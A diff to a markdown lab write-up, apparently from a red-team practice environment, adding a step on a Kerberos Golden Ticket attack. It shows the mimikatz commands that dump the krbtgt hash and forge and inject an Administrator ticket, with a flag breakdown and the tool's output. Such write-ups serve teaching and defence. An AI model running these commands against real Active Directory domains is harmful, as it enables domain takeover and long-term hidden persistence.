@@ -137,7 +137,7 @@ Got the Administrator NTLM hash sitting right in memory. No cracking needed — 
   <img src="/writeups/golden ticket/images/Screenshot_4.png" width="600">
 </p>
 
-## Dumping krbtgt Hash
+## Step - 4 Dumping krbtgt Hash
 
 ```bash
 mimikatz # lsadump::lsa /inject /name:krbtgt
@@ -153,3 +153,50 @@ mimikatz # lsadump::lsa /inject /name:krbtgt
 ```
 
 Instead of dumping all accounts like `lsadump::lsa /patch`, this command goes after one specific account — `krbtgt`. This is the account I need to forge a Golden Ticket. It gives me the NTLM hash and the domain SID in one shot.
+
+## Step - 5 Generating and Injecting the Golden Ticket
+
+```bash
+kerberos::golden /user:Administrator /domain:readteambd.local /sid:S-1-5-21-2745015721-426968701-4006811760 /krbtgt:5f8156b8f557baae7cd069ac724e1959 /id:500 /ptt
+```
+
+### Flag Breakdown
+
+| Flag | Value | Description |
+|------|-------|-------------|
+| `/user` | `Administrator` | The user I am impersonating |
+| `/domain` | `readteambd.local` | The domain name |
+| `/sid` | `S-1-5-21-2745015721-426968701-4006811760` | The domain SID |
+| `/krbtgt` | `5f8156b8f557baae7cd069ac724e1959` | The krbtgt NTLM hash used to sign the ticket |
+| `/id` | `500` | RID of Administrator account — 500 is always the built-in Administrator |
+| `/ptt` | — | Pass the Ticket — injects the forged ticket directly into memory instead of saving to a file |
+
+### `/ptt` vs `/ticket`
+
+| Flag | What it does |
+|------|-------------|
+| `/ptt` | Injects ticket directly into current session memory |
+| `/ticket` | Saves the ticket to a `.kirbi` file for later use |
+
+I used `/ptt` here so the ticket gets loaded into my session immediately — no need to load it manually afterwards.
+
+**Output:**
+
+```
+User      : Administrator
+Domain    : readteambd.local (READTEAMBD)
+SID       : S-1-5-21-2745015721-426968701-4006811760
+User Id   : 500
+Groups Id : *513 512 520 518 519
+ServiceKey: 5f8156b8f557baae7cd069ac724e1959 - rc4_hmac_nt
+Lifetime  : 6/6/2026 9:15:09 PM ; 6/3/2036 9:15:09 PM ; 6/3/2036 9:15:09 PM
+-> Ticket : ** Pass The Ticket **
+
+ * PAC generated
+ * PAC signed
+ * EncTicketPart generated
+ * EncTicketPart encrypted
+ * KrbCred generated
+
+Golden ticket for 'Administrator @ readteambd.local' successfully submitted for current session
+```
